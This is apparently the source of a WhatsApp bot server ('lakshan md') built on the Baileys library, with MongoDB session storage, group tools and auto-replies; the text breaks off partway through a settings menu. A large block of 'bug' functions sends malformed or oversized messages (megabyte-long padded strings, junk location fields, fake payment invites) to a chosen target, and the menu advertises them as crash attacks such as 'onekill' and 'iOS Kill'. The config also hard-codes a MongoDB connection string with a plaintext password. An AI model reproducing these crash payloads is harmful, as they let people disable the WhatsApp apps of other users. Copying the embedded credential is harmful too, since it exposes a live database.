const express = require('express');
const fs = require('fs-extra');
const path = require('path');
const os = require('os');
const { exec } = require('child_process');
const router = express.Router();
const pino = require('pino');
const moment = require('moment-timezone');
const crypto = require('crypto');
const axios = require('axios');
const { MongoClient } = require('mongodb');
const { proto, generateWAMessageFromContent } = require('@whiskeysockets/baileys');

const {
  default: makeWASocket,
  useMultiFileAuthState,
  delay,
  getContentType,
  jidNormalizedUser,
  DisconnectReason
} = require('@whiskeysockets/baileys');

// ==================== CONFIG ====================

const BOT_NAME_FANCY = 'lakshan md';

const config = {
  MONGO_URI: process.env.MONGO_URI || 'mongodb+srv://lakshan:12345lakshan@cluster0.k6w7ris.mongodb.net/',
  SESSION_ID: process.env.SESSION_ID || '',
  CREDS_JSON: process.env.CREDS_JSON || '',
  AUTO_VIEW_STATUS: 'true',
  AUTO_LIKE_STATUS: 'true',
  AUTO_RECORDING: 'false',
  AUTO_TYPING: 'false',
  AUTO_READ_MESSAGE: 'off',
  ANTI_CALL: 'off',
  WORK_TYPE: 'public',
  DELETE_MESSAGE_NOTIFY: 'off',
  AUTO_LIKE_EMOJI: ['💙', '🩷', '💜', '🤎', '🧡', '🩵', '💛', '🩶', '♥️', '💗', '❤️‍🔥'],
  PREFIX: '.',
  MAX_RETRIES: 3,
  GROUP_INVITE_LINK: 'https://chat.whatsapp.com/JBIQDUg6f7g5AvExseAzO4?mode=hqctcla',
  CHANNEL_LINK: 'https://whatsapp.com/channel/0029VbAWcvCLY6dAjn0FnW0L',
  RCD_IMAGE_PATH: 'https://whiteshadow-uploder.zone.id/files/13z.jpg',
  OTP_EXPIRY: 300000,
  OWNER_NUMBER: process.env.OWNER_NUMBER || '94789227570',
  BOT_NAME: 'laksha md',
  BOT_VERSION: '1.0.0V',
  OWNER_NAME: 'lakshan',
  IMAGE_PATH: 'https://whiteshadow-uploder.zone.id/files/13z.jpg',
  BOT_FOOTER: '> *lakshan md*'
};

// ==================== MONGO SETUP ====================

const MONGO_URI = config.MONGO_URI;
const MONGO_DB = process.env.MONGO_DB || 'FREE';

let mongoClient, mongoDB;
let sessionsCol, numbersCol, adminsCol, newsletterCol, configsCol, newsletterReactsCol, bugReportsCol, autoreplyCol;

async function initMongo() {
  try {
    if (mongoClient && mongoClient.topology && mongoClient.topology.isConnected && mongoClient.topology.isConnected()) return;
  } catch (e) { }
  mongoClient = new MongoClient(MONGO_URI, { useNewUrlParser: true, useUnifiedTopology: true });
  await mongoClient.connect();
  mongoDB = mongoClient.db(MONGO_DB);

  sessionsCol = mongoDB.collection('sessions');
  numbersCol = mongoDB.collection('numbers');
  adminsCol = mongoDB.collection('admins');
  newsletterCol = mongoDB.collection('newsletter_list');
  configsCol = mongoDB.collection('configs');
  newsletterReactsCol = mongoDB.collection('newsletter_reacts');
  bugReportsCol = mongoDB.collection('bug_reports');
  autoreplyCol = mongoDB.collection('autoreply');

  await sessionsCol.createIndex({ number: 1 }, { unique: true });
  await numbersCol.createIndex({ number: 1 }, { unique: true });
  await newsletterCol.createIndex({ jid: 1 }, { unique: true });
  await newsletterReactsCol.createIndex({ jid: 1 }, { unique: true });
  await configsCol.createIndex({ number: 1 }, { unique: true });
  await bugReportsCol.createIndex({ timestamp: -1 });
  await autoreplyCol.createIndex({ chatId: 1, trigger: 1 });
  console.log('✅ Mongo initialized');
}

// ==================== CREDENTIAL FUNCTIONS ====================

async function saveCredsToMongo(number, creds, keys = null) {
  try {
    await initMongo();
    const sanitized = number.replace(/[^0-9]/g, '');
    const doc = { number: sanitized, creds, keys, updatedAt: new Date() };
    await sessionsCol.updateOne({ number: sanitized }, { $set: doc }, { upsert: true });
  } catch (e) { console.error('saveCredsToMongo error:', e); }
}

async function loadCredsFromMongo(number) {
  try {
    await initMongo();
    const sanitized = number.replace(/[^0-9]/g, '');
    const doc = await sessionsCol.findOne({ number: sanitized });
    return doc || null;
  } catch (e) { return null; }
}

async function removeSessionFromMongo(number) {
  try {
    await initMongo();
    const sanitized = number.replace(/[^0-9]/g, '');
    await sessionsCol.deleteOne({ number: sanitized });
  } catch (e) { }
}

async function addNumberToMongo(number) {
  try {
    await initMongo();
    const sanitized = number.replace(/[^0-9]/g, '');
    await numbersCol.updateOne({ number: sanitized }, { $set: { number: sanitized } }, { upsert: true });
  } catch (e) { }
}

async function removeNumberFromMongo(number) {
  try {
    await initMongo();
    const sanitized = number.replace(/[^0-9]/g, '');
    await numbersCol.deleteOne({ number: sanitized });
  } catch (e) { }
}

async function getAllNumbersFromMongo() {
  try {
    await initMongo();
    const docs = await numbersCol.find({}).toArray();
    return docs.map(d => d.number);
  } catch (e) { return []; }
}

// ==================== ADMIN FUNCTIONS ====================

async function loadAdminsFromMongo() {
  try {
    await initMongo();
    const docs = await adminsCol.find({}).toArray();
    return docs.map(d => d.jid || d.number).filter(Boolean);
  } catch (e) { return []; }
}

async function addAdminToMongo(jidOrNumber) {
  try {
    await initMongo();
    await adminsCol.updateOne({ jid: jidOrNumber }, { $set: { jid: jidOrNumber } }, { upsert: true });
  } catch (e) { }
}

async function removeAdminFromMongo(jidOrNumber) {
  try {
    await initMongo();
    await adminsCol.deleteOne({ jid: jidOrNumber });
  } catch (e) { }
}

// ==================== NEWSLETTER FUNCTIONS ====================

async function addNewsletterToMongo(jid, emojis = []) {
  try {
    await initMongo();
    await newsletterCol.updateOne({ jid }, { $set: { jid, emojis: Array.isArray(emojis) ? emojis : [], addedAt: new Date() } }, { upsert: true });
  } catch (e) { throw e; }
}

async function removeNewsletterFromMongo(jid) {
  try {
    await initMongo();
    await newsletterCol.deleteOne({ jid });
  } catch (e) { throw e; }
}

async function listNewslettersFromMongo() {
  try {
    await initMongo();
    const docs = await newsletterCol.find({}).toArray();
    return docs.map(d => ({ jid: d.jid, emojis: Array.isArray(d.emojis) ? d.emojis : [] }));
  } catch (e) { return []; }
}

// ==================== CONFIG FUNCTIONS ====================

async function setSettingPasswordInMongo(number, password) {
  try {
    await initMongo();
    const sanitized = number.replace(/[^0-9]/g, '');
    await configsCol.updateOne(
      { number: sanitized },
      { $set: { settingPassword: password, settingPasswordAt: new Date() } },
      { upsert: true }
    );
  } catch (e) { }
}

async function getSettingPasswordFromMongo(number) {
  try {
    await initMongo();
    const sanitized = number.replace(/[^0-9]/g, '');
    const doc = await configsCol.findOne({ number: sanitized });
    return doc ? doc.settingPassword : null;
  } catch (e) { return null; }
}

async function setUserConfigInMongo(number, conf) {
  try {
    await initMongo();
    const sanitized = number.replace(/[^0-9]/g, '');
    await configsCol.updateOne({ number: sanitized }, { $set: { number: sanitized, config: conf, updatedAt: new Date() } }, { upsert: true });
  } catch (e) { }
}

async function loadUserConfigFromMongo(number) {
  try {
    await initMongo();
    const sanitized = number.replace(/[^0-9]/g, '');
    const doc = await configsCol.findOne({ number: sanitized });
    return doc ? doc.config : null;
  } catch (e) { return null; }
}

// ==================== AUTO REPLY FUNCTIONS ====================

async function addAutoReply(chatId, trigger, response, type = 'text') {
  try {
    await initMongo();
    await autoreplyCol.updateOne(
      { chatId, trigger },
      { $set: { chatId, trigger, response, type, updatedAt: new Date() } },
      { upsert: true }
    );
    return true;
  } catch (e) { return false; }
}

async function removeAutoReply(chatId, trigger) {
  try {
    await initMongo();
    await autoreplyCol.deleteOne({ chatId, trigger });
    return true;
  } catch (e) { return false; }
}

async function getAutoReplies(chatId) {
  try {
    await initMongo();
    return await autoreplyCol.find({ chatId }).toArray();
  } catch (e) { return []; }
}

async function checkAutoReply(chatId, message) {
  try {
    const replies = await autoreplyCol.find({ chatId }).toArray();
    for (const reply of replies) {
      if (message.toLowerCase().includes(reply.trigger.toLowerCase())) {
        return reply;
      }
    }
    return null;
  } catch (e) { return null; }
}

// ==================== BUG REPORT FUNCTIONS ====================

async function saveBugReport(number, bugType, details, severity = 'medium', targetJid = null) {
  try {
    await initMongo();
    const report = {
      number: number.replace(/[^0-9]/g, ''),
      bugType,
      details,
      severity,
      targetJid,
      timestamp: new Date(),
      status: 'pending'
    };
    await bugReportsCol.insertOne(report);
    return report;
  } catch (e) { return null; }
}

async function getBugReports(limit = 50) {
  try {
    await initMongo();
    return await bugReportsCol.find({}).sort({ timestamp: -1 }).limit(limit).toArray();
  } catch (e) { return []; }
}

// ==================== UTILITY FUNCTIONS ====================

function generateOTP() { return Math.floor(100000 + Math.random() * 900000).toString(); }
function getSriLankaTimestamp() { return moment().tz('Asia/Colombo').format('YYYY-MM-DD HH:mm:ss'); }
function generateSettingPassword() { return crypto.randomBytes(4).toString('hex').toUpperCase(); }
function runtime(seconds) {
  seconds = Number(seconds);
  var d = Math.floor(seconds / (3600 * 24));
  var h = Math.floor(seconds % (3600 * 24) / 3600);
  var m = Math.floor(seconds % 3600 / 60);
  var s = Math.floor(seconds % 60);
  var dDisplay = d > 0 ? d + (d == 1 ? " day " : " days ") : "";
  var hDisplay = h > 0 ? h + (h == 1 ? " hour " : " hours ") : "";
  var mDisplay = m > 0 ? m + (m == 1 ? " minute " : " minutes ") : "";
  var sDisplay = s > 0 ? s + (s == 1 ? " second" : " seconds") : "";
  return dDisplay + hDisplay + mDisplay + sDisplay;
}

const activeSockets = new Map();
const socketCreationTime = new Map();
const otpStore = new Map();
const numberReplyTracker = new Map();
const reconnectAttempts = new Map();
const MAX_RECONNECT_ATTEMPTS = 10;
const settingTokens = new Map();

// ==================== FAKE MESSAGE OBJECTS FOR BUGS (from XeonBug8) ====================

const oneclickxeon = {
  key: { participant: `0@s.whatsapp.net`, remoteJid: "status@broadcast" },
  message: { listResponseMessage: { title: `𝐓𝐎𝐇𝐈𝐃_𝐊𝐇𝐀𝐍-V2` } }
};

const force = {
  key: { participant: `0@s.whatsapp.net`, remoteJid: "status@broadcast" },
  message: {
    "interactiveMessage": {
      "header": { "hasMediaAttachment": true },
      "nativeFlowMessage": {
        "buttons": [{
          "name": "review_and_pay",
          "buttonParamsJson": `{\"currency\":\"INR\",\"total_amount\":{\"value\":49981399788,\"offset\":100},\"reference_id\":\"4OON4PX3FFJ\",\"type\":\"physical-goods\"}`
        }]
      }
    }
  }
};

const force2 = {
  key: { participant: `0@s.whatsapp.net`, remoteJid: "status@broadcast" },
  message: {
    "interactiveMessage": {
      "header": { "hasMediaAttachment": true },
      "nativeFlowMessage": {
        "buttons": [{
          "name": "review_and_pay",
          "buttonParamsJson": `{\"currency\":\"IDR\",\"total_amount\":{\"value\":49981399788,\"offset\":100}}`
        }]
      }
    }
  }
};

// ==================== BUG FUNCTIONS (from XeonBug8) ====================

async function blackening(socket, target, kuwoted) {
  var etc = generateWAMessageFromContent(target, proto.Message.fromObject({
    "stickerMessage": {
      "url": "https://mmg.whatsapp.net/o1/v/t62.7118-24/f1/m233/up-oil-image-8529758d-c4dd-4aa7-9c96-c6e2339c87e5?ccb=9-4",
      "fileSha256": "CWJIxa1y5oks/xelBSo440YE3bib/c/I4viYkrCQCFE=",
      "fileEncSha256": "r6UKMeCSz4laAAV7emLiGFu/Rup9KdbInS2GY5rZmA4=",
      "mediaKey": "4l/QOq+9jLOYT2m4mQ5Smt652SXZ3ERnrTfIsOmHWlU=",
      "mimetype": "image/webp",
      "fileLength": "10116",
      "isAnimated": false
    }
  }), { userJid: target, quoted: kuwoted });
  await socket.relayMessage(target, etc.message, { participant: { jid: target }, messageId: etc.key.id });
}

async function locationxeony(socket, target, kuwoted) {
  var etc = generateWAMessageFromContent(target, proto.Message.fromObject({
    viewOnceMessage: {
      message: {
        "liveLocationMessage": {
          "degreesLatitude": "p",
          "degreesLongitude": "p",
          "caption": "𝐓𝐎𝐇𝐈𝐃_𝐊𝐇𝐀𝐍-V2" + "ꦾ".repeat(50000),
          "sequenceNumber": "0",
          "jpegThumbnail": ""
        }
      }
    }
  }), { userJid: target, quoted: kuwoted });
  await socket.relayMessage(target, etc.message, { participant: { jid: target }, messageId: etc.key.id });
}

async function xeonkillpic(socket, target, kuwoted) {
  var etc = generateWAMessageFromContent(target, proto.Message.fromObject({
    interactiveMessage: {
      header: { title: "𝐓𝐎𝐇𝐈𝐃_𝐊𝐇𝐀𝐍-V2", hasMediaAttachment: true },
      body: { text: "" },
      footer: { text: "› #𝐓𝐎𝐇𝐈𝐃_𝐊𝐇𝐀𝐍-V2" },
      nativeFlowMessage: { messageParamsJson: "".repeat(1000000) }
    }
  }), { userJid: target, quoted: kuwoted });
  await socket.relayMessage(target, etc.message, { participant: { jid: target }, messageId: etc.key.id });
}

async function aipong(socket, target) {
  await socket.relayMessage(target, {
    paymentInviteMessage: { serviceType: "FBPAY", expiryTimestamp: Date.now() + 1814400000 }
  }, { participant: { jid: target } });
}

async function listxeonfck(socket, target, kuwoted) {
  var etc = generateWAMessageFromContent(target, proto.Message.fromObject({
    'listMessage': {
      'title': "𝐓𝐎𝐇𝐈𝐃_𝐊𝐇𝐀𝐍-V2" + "".repeat(920000),
      'footerText': "𝐓𝐎𝐇𝐈𝐃_𝐊𝐇𝐀𝐍-V2",
      'description': "𝐓𝐎𝐇𝐈𝐃_𝐊𝐇𝐀𝐍-V2",
      'buttonText': null,
      'listType': 2,
      'productListInfo': {
        'productSections': [{ 'title': 'anjay', 'products': [{ "productId": "4392524570816732" }] }],
        'businessOwnerJid': '0@s.whatsapp.net'
      }
    }
  }), { userJid: target, quoted: oneclickxeon });
  await socket.relayMessage(target, etc.message, { participant: { jid: target }, messageId: etc.key.id });
}

async function sendSystemCrashMessage(socket, jid) {
  var messageContent = generateWAMessageFromContent(jid, proto.Message.fromObject({
    'viewOnceMessage': {
      'message': {
        'interactiveMessage': {
          'header': { 'title': '', 'subtitle': " " },
          'body': { 'text': "🔥 SYSTEM UI CRASH 🔥" },
          'footer': { 'text': 'XP' },
          'nativeFlowMessage': {
            'buttons': [{
              'name': 'cta_url',
              'buttonParamsJson': "{ display_text : 'CRASH', url : '', merchant_url : '' }"
            }],
            'messageParamsJson': "\0".repeat(1000000)
          }
        }
      }
    }
  }), { 'userJid': jid });
  await socket.relayMessage(jid, messageContent.message, { 'participant': { 'jid': jid }, 'messageId': messageContent.key.id });
}

async function sendListMessage(socket, jid) {
  var messageContent = generateWAMessageFromContent(jid, proto.Message.fromObject({
    'listMessage': {
      'title': "🔥 LIST CRASH 🔥" + "\0".repeat(920000),
      'footerText': "Xeon Bug",
      'description': "Xeon Bug",
      'buttonText': null,
      'listType': 2,
      'productListInfo': {
        'productSections': [{ 'title': "bug", 'products': [{ 'productId': "4392524570816732" }] }],
        'businessOwnerJid': "0@s.whatsapp.net"
      }
    }
  }), { 'userJid': jid });
  await socket.relayMessage(jid, messageContent.message, { 'participant': { 'jid': jid }, 'messageId': messageContent.key.id });
}

async function sendLiveLocationMessage(socket, jid) {
  var messageContent = generateWAMessageFromContent(jid, proto.Message.fromObject({
    'viewOnceMessage': {
      'message': {
        'liveLocationMessage': {
          'degreesLatitude': 'p',
          'degreesLongitude': 'p',
          'caption': '🔥 LOCATION CRASH 🔥' + 'ꦾ'.repeat(50000),
          'sequenceNumber': '0',
          'jpegThumbnail': ''
        }
      }
    }
  }), { 'userJid': jid });
  await socket.relayMessage(jid, messageContent.message, { 'participant': { 'jid': jid }, 'messageId': messageContent.key.id });
}

async function sendPaymentInvite(socket, jid) {
  await socket.relayMessage(jid, {
    'paymentInviteMessage': { 'serviceType': "UPI", 'expiryTimestamp': Date.now() + 86400000 }
  }, { 'participant': { 'jid': jid } });
}

async function sendViewOnceMessages(socket, jid, count) {
  for (let i = 0; i < count; i++) {
    let messageContent = generateWAMessageFromContent(jid, {
      'viewOnceMessage': {
        'message': {
          'interactiveMessage': {
            'body': { 'text': '' },
            'footer': { 'text': '' },
            'nativeFlowMessage': {
              'buttons': [{
                'name': "cta_url",
                'buttonParamsJson': "{\"display_text\":\"🔥 VIEWONCE SPAM 🔥\",\"url\":\"https://www.google.com\"}"
              }],
              'messageParamsJson': "\0".repeat(100000)
            }
          }
        }
      }
    }, {});
    await socket.relayMessage(jid, messageContent.message, { 'messageId': messageContent.key.id });
    await delay(100);
  }
}

async function sendVariousMessages(socket, jid, count) {
  for (let i = 0; i < count; i++) {
    await sendListMessage(socket, jid);
    await sendLiveLocationMessage(socket, jid);
    await sendSystemCrashMessage(socket, jid);
    await delay(500);
  }
}

async function sendMixedMessages(socket, jid, count) {
  for (let i = 0; i < count; i++) {
    await sendLiveLocationMessage(socket, jid);
    await sendListMessage(socket, jid);
    await delay(500);
  }
}

async function oneKillCombo(socket, target) {
  for (let j = 0; j < 1; j++) {
    await listxeonfck(socket, target, oneclickxeon);
    await locationxeony(socket, target, force);
    await xeonkillpic(socket, target, oneclickxeon);
    await locationxeony(socket, target, force);
    await blackening(socket, target, force2);
    await locationxeony(socket, target, force);
  }
}

async function iosKill(socket, target, duration = 10) {
  for (let i = 0; i < duration; i++) {
    await aipong(socket, target);
    await delay(1200);
  }
}

// ==================== SEND IMAGE WITH MESSAGE (NO VIDEO) ====================

async function sendImageWithMessage(socket, jid, imageUrl, caption, footer, mentionedJid = [], metaQuote = null) {
  try {
    const logo = imageUrl || config.RCD_IMAGE_PATH;
    await socket.sendMessage(jid, { 
      image: { url: logo }, 
      caption: caption + `\n\n> *${footer}*`,
      mentions: mentionedJid
    }, { quoted: metaQuote });
  } catch (error) {
    console.error('Send image error:', error);
    await socket.sendMessage(jid, { text: caption }, { quoted: metaQuote, mentions: mentionedJid });
  }
}

// ==================== JOIN GROUP ====================

async function joinGroup(socket) {
  let retries = config.MAX_RETRIES;
  const inviteCodeMatch = (config.GROUP_INVITE_LINK || '').match(/chat\.whatsapp\.com\/([a-zA-Z0-9]+)/);
  if (!inviteCodeMatch) return { status: 'failed', error: 'No group invite configured' };
  const inviteCode = inviteCodeMatch[1];
  while (retries > 0) {
    try {
      const response = await socket.groupAcceptInvite(inviteCode);
      if (response?.gid) return { status: 'success', gid: response.gid };
      throw new Error('No group ID in response');
    } catch (error) {
      retries--;
      let errorMessage = error.message || 'Unknown error';
      if (error.message && error.message.includes('not-authorized')) errorMessage = 'Bot not authorized';
      else if (error.message && error.message.includes('conflict')) errorMessage = 'Already a member';
      else if (error.message && error.message.includes('gone')) errorMessage = 'Invite invalid/expired';
      if (retries === 0) return { status: 'failed', error: errorMessage };
      await delay(2000);
    }
  }
  return { status: 'failed', error: 'Max retries reached' };
}

// ==================== FOLLOW CHANNEL ====================

async function followChannel(socket) {
  try {
    const channelLink = config.CHANNEL_LINK;
    const match = channelLink.match(/channel\/([a-zA-Z0-9]+)/);
    if (!match) return { status: 'failed', error: 'Invalid channel link' };
    const channelId = match[1];
    const channelJid = `${channelId}@newsletter`;
    if (typeof socket.newsletterFollow === 'function') {
      await socket.newsletterFollow(channelJid);
      await addNewsletterToMongo(channelJid, config.AUTO_LIKE_EMOJI);
      return { status: 'success', jid: channelJid };
    }
    return { status: 'failed', error: 'newsletterFollow not supported' };
  } catch (error) {
    return { status: 'failed', error: error.message };
  }
}

async function sendAdminConnectMessage(socket, number, groupResult, channelResult, sessionConfig = {}) {
  const admins = await loadAdminsFromMongo();
  const groupStatus = groupResult.status === 'success' ? `✅ Joined Group` : `❌ ${groupResult.error}`;
  const channelStatus = channelResult.status === 'success' ? `✅ Followed Channel` : `❌ ${channelResult.error}`;
  const botName = sessionConfig.botName || BOT_NAME_FANCY;
  
  const caption = `╭━━━━━━━━━━━━━❥❥❥
┃ 🤖 *${botName}*
┃ 📞 *Number:* ${number}
┃ 🏠 *Group:* ${groupStatus}
┃ 📰 *Channel:* ${channelStatus}
┃ 🕒 *Time:* ${getSriLankaTimestamp()}
╰━━━━━━━━━━━━━❥❥❥

> ☠️ Bot Connected Successfully!`;

  for (const admin of admins) {
    try {
      const to = admin.includes('@') ? admin : `${admin}@s.whatsapp.net`;
      await sendImageWithMessage(socket, to, config.RCD_IMAGE_PATH, caption, botName);
    } catch (err) { }
  }
}

async function sendOwnerConnectMessage(socket, number, groupResult, channelResult, sessionConfig = {}) {
  try {
    const ownerJid = `${config.OWNER_NUMBER.replace(/[^0-9]/g, '')}@s.whatsapp.net`;
    const activeCount = activeSockets.size;
    const botName = sessionConfig.botName || BOT_NAME_FANCY;
    const groupStatus = groupResult.status === 'success' ? `✅ Joined Group` : `❌ ${groupResult.error}`;
    const channelStatus = channelResult.status === 'success' ? `✅ Followed Channel` : `❌ ${channelResult.error}`;
    
    const caption = `╭━━━━━━━━━━━━━❥❥❥
┃ 👑 *Owner Notice*
┃ 🤖 *${botName}*
┃ 📞 *Number:* ${number}
┃ 🏠 *Group:* ${groupStatus}
┃ 📰 *Channel:* ${channelStatus}
┃ 🔢 *Active:* ${activeCount}
┃ 🕒 *Time:* ${getSriLankaTimestamp()}
╰━━━━━━━━━━━━━❥❥❥

> ☠️ New Bot Connected!`;
    
    await sendImageWithMessage(socket, ownerJid, config.RCD_IMAGE_PATH, caption, botName);
  } catch (err) { }
}

async function sendOTP(socket, number, otp) {
  const userJid = jidNormalizedUser(socket.user.id);
  const message = `🔐 *OTP VERIFICATION*\n\nYour OTP: *${otp}*\nExpires in 5 minutes.\n\nNumber: ${number}`;
  try { await socket.sendMessage(userJid, { text: message }); } catch (error) { throw error; }
}

// ==================== GROUP HELPER FUNCTIONS ====================

async function isUserAdmin(socket, jid, participant) {
  try {
    const groupMetadata = await socket.groupMetadata(jid);
    const user = groupMetadata.participants.find(p => p.id === participant);
    return user && (user.admin === 'admin' || user.admin === 'superadmin');
  } catch { return false; }
}

async function isBotAdmin(socket, jid) {
  try {
    const groupMetadata = await socket.groupMetadata(jid);
    const botId = socket.user.id.split(':')[0] + '@s.whatsapp.net';
    const bot = groupMetadata.participants.find(p => p.id === botId);
    return bot && (bot.admin === 'admin' || bot.admin === 'superadmin');
  } catch { return false; }
}

async function getUserProfilePicture(socket, jid) {
  try {
    return await socket.profilePictureUrl(jid, 'image');
  } catch { return null; }
}

// ==================== COMMAND HANDLERS ====================

function setupCommandHandlers(socket, number) {
  socket.ev.on('messages.upsert', async ({ messages }) => {
    const msg = messages[0];
    if (!msg || !msg.message || msg.key.remoteJid === 'status@broadcast') return;

    const type = getContentType(msg.message);
    if (!msg.message) return;
    msg.message = (getContentType(msg.message) === 'ephemeralMessage') ? msg.message.ephemeralMessage.message : msg.message;

    const from = msg.key.remoteJid;
    const sender = from;
    const nowsender = msg.key.fromMe ? (socket.user.id.split(':')[0] + '@s.whatsapp.net') : (msg.key.participant || msg.key.remoteJid);
    const senderNumber = (nowsender || '').split('@')[0];
    const developers = config.OWNER_NUMBER;
    const botNumber = socket.user.id.split(':')[0];
    const isOwner = developers.includes(senderNumber);
    const isGroup = from.endsWith("@g.us");

    let body = (type === 'conversation') ? msg.message.conversation
      : (type === 'extendedTextMessage') ? msg.message.extendedTextMessage.text
      : (type == 'imageMessage') && msg.message.imageMessage.caption ? msg.message.imageMessage.caption
      : (type == 'videoMessage') && msg.message.videoMessage.caption ? msg.message.videoMessage.caption
      : '';
    body = String(body || '');

    if (!body || typeof body !== 'string') return;

    // ==================== AUTO REPLY SYSTEM ====================
    const prefix = config.PREFIX;
    const isCmd = body.startsWith(prefix);
    
    if (!isCmd && body.length > 0) {
      const autoReply = await checkAutoReply(from, body);
      if (autoReply) {
        await sendImageWithMessage(socket, from, config.RCD_IMAGE_PATH, autoReply.response, BOT_NAME_FANCY);
        return;
      }
    }

    const command = isCmd ? body.slice(prefix.length).trim().split(' ').shift().toLowerCase() : null;
    const args = body.trim().split(/ +/).slice(1);

    // ==================== NUMBER REPLY SYSTEM FOR MENU ====================
    if (body.match(/^[0-9]+$/) && body.length >= 1 && body.length <= 2 && !isCmd) {
      const repliedNumber = body;
      const sanitized = (number || '').replace(/[^0-9]/g, '');
      const userConfig = await loadUserConfigFromMongo(sanitized) || {};
      const botName = userConfig.botName || BOT_NAME_FANCY;
      const logo = userConfig.logo || config.RCD_IMAGE_PATH;
      
      const lastMenuTime = numberReplyTracker.get(senderNumber) || 0;
      if (Date.now() - lastMenuTime > 300000) {
        await sendImageWithMessage(socket, sender, logo, `❌ Menu expired. Please type ${prefix}menu again.`, botName);
        return;
      }
      
      const mainMenu = `╭━━━━━━━━━━━━━❥❥❥
┃     *☠️ MAIN MENU ☠️*
╰━━━━━━━━━━━━━❥❥❥
╭━━━━━━━━━━━━━❥❥❥
┃ *👑 Owner:* ${config.OWNER_NAME}
┃ *📌 Version:* ${config.BOT_VERSION}
┃ *⚡ Commands:* 50+
┃ *🔧 Prefix:* [ ${prefix} ]
┃ *🟢 Active Bots:* ${activeSockets.size}
┃ *🐛 Bugs:* 8 Types
╰━━━━━━━━━━━━━❥❥❥
╭━「 Reply Number ⤵️ 」━╮
┃ *1* - OWNER MENU
┃ *2* - GROUP MENU
┃ *3* - BUG MENU 🐛
┃ *4* - AUTO REPLY MENU
┃ *5* - TOOLS MENU
┃ *6* - SETTINGS
╰━━━━━━━━━━━━━❥❥❥

> ☠️ Type ${prefix}help for all commands`;
      
      if (repliedNumber === '1') {
        const ownerMenu = `╭━━━━━━━━━━━━━❥❥❥
┃     *👑 OWNER MENU*
╰━━━━━━━━━━━━━❥❥❥
╭━━━━━━━━━━━━━❥❥❥
┃ *🔧 System:* shutdown, restart, broadcast
┃ *👥 Admin:* addadmin, removeadmin, listadmin
┃ *📱 Session:* getsession, delsession
┃ *📊 Stats:* totalhit, listbugs
╰━━━━━━━━━━━━━❥❥❥
╭━「 Reply Number ⤵️ 」━╮
┃ *0* - BACK TO MAIN
╰━━━━━━━━━━━━━❥❥❥

> ☠️ Owner Only Commands`;
        await sendImageWithMessage(socket, sender, logo, ownerMenu, botName);
        numberReplyTracker.set(senderNumber, Date.now());
      }
      else if (repliedNumber === '2') {
        const groupMenu = `╭━━━━━━━━━━━━━❥❥❥
┃     *👥 GROUP MENU*
╰━━━━━━━━━━━━━❥❥❥
╭━━━━━━━━━━━━━❥❥❥
┃ *👤 Member:* kick, add, promote, demote
┃ *📢 Message:* tagall, hidetag
┃ *⚙️ Settings:* group open/close, setname, setdesc
┃ *🔗 Link:* linkgc, revoke, leave
╰━━━━━━━━━━━━━❥❥❥
╭━「 Reply Number ⤵️ 」━╮
┃ *0* - BACK TO MAIN
╰━━━━━━━━━━━━━❥❥❥

> ☠️ Group Management Commands`;
        await sendImageWithMessage(socket, sender, logo, groupMenu, botName);
        numberReplyTracker.set(senderNumber, Date.now());
      }
      else if (repliedNumber === '3') {
        const bugMenu = `╭━━━━━━━━━━━━━❥❥❥
┃     *🐛 BUG MENU 🐛*
╰━━━━━━━━━━━━━❥❥❥
╭━━━━━━━━━━━━━❥❥❥
┃ *🔴 onekill* - One Kill Combo
┃ *🟠 iosk* - iOS Kill (Payment)
┃ *🟡 sysui* - System UI Crash
┃ *🟢 list* - List Message Crash
┃ *🔵 loc* - Location Crash
┃ *🟣 sticker* - Sticker Crash
┃ *⚫ viewonce* - ViewOnce Spam
┃ *🟤 mixed* - Mixed Crash
╰━━━━━━━━━━━━━❥❥❥
╭━「 Reply Number ⤵️ 」━╮
┃ *0* - BACK TO MAIN
╰━━━━━━━━━━━━━❥❥❥

⚠️ *WARNING:* Can crash WhatsApp!
> ☠️ Use ${prefix}bug <type> to activate`;
        await sendImageWithMessage(socket, sender, logo, bugMenu, botName);
        numberReplyTracker.set(senderNumber, Date.now());
      }
      else if (repliedNumber === '4') {
        const autoreplyMenu = `╭━━━━━━━━━━━━━❥❥❥
┃     *💬 AUTO REPLY MENU*
╰━━━━━━━━━━━━━❥❥❥
╭━━━━━━━━━━━━━❥❥❥
┃ *📝 setreply trigger|response* - Add auto reply
┃ *🗑️ delreply trigger* - Remove auto reply
┃ *📋 listreply* - List all auto replies
╰━━━━━━━━━━━━━❥❥❥
╭━「 Reply Number ⤵️ 」━╮
┃ *0* - BACK TO MAIN
╰━━━━━━━━━━━━━❥❥❥

> ☠️ Auto Reply Management`;
        await sendImageWithMessage(socket, sender, logo, autoreplyMenu, botName);
        numberReplyTracker.set(senderNumber, Date.now());
      }
      else if (repliedNumber === '5') {
        const toolsMenu = `╭━━━━━━━━━━━━━❥❥❥
┃     *🛠️ TOOLS MENU*
╰━━━━━━━━━━━━━❥❥❥
╭━━━━━━━━━━━━━❥❥❥
┃ *🖼️ getdp* - Get profile picture
┃ *ℹ️ about* - Get user about
┃ *📰 follow/unfollow* - Newsletter
┃ *❤️ chr* - React to channel post
╰━━━━━━━━━━━━━❥❥❥
╭━「 Reply Number ⤵️ 」━╮
┃ *0* - BACK TO MAIN
╰━━━━━━━━━━━━━❥❥❥

> ☠️ Utility Commands`;
        await sendImageWithMessage(socket, sender, logo, toolsMenu, botName);
        numberReplyTracker.set(senderNumber, Date.now());
      }
      else if (repliedNumber === '6') {
        const currentConfig = await loadUserConfigFromMongo(number.replace(/[^0-9]/g, '')) || {};
        const settingsMenu = `╭━━━━━━━━━━━━━❥❥❥
┃     *⚙️ SETTINGS PANEL*
╰━━━━━━━━━━━━━❥❥❥
╭━━━━━━━━━━━━━❥❥❥
┃ *1* - Auto View Status: ${currentConfig.AUTO_VIEW_STATUS || config.AUTO_VIEW_STATUS === 'true' ? '✅ ON' : '❌ OFF'}
┃ *2* - Auto Like Status: ${currentConfig.AUTO_LIKE_STATUS || config.AUTO_LIKE_STATUS === 'true' ? '✅ ON' : '❌ OFF'}
┃ *3* - Auto Recording: ${currentConfig.AUTO_RECORDING || config.AUTO_RECORDING === 'true' ? '✅ ON' : '❌ OFF'}
┃ *4* - Auto Typing: ${currentConfig.AUTO_TYPING || config.AUTO_TYPING === 'true' ? '✅ ON' : '❌ OFF'}
┃ *5* - Auto Read Msg: ${currentConfig.AUTO_READ_MESSAGE || config.AUTO_READ_MESSAGE}
┃ *6* - Anti Call: ${currentConfig.ANTI_CALL || config.ANTI_CALL === 'on' ? '✅ ON' : '❌ OFF'}
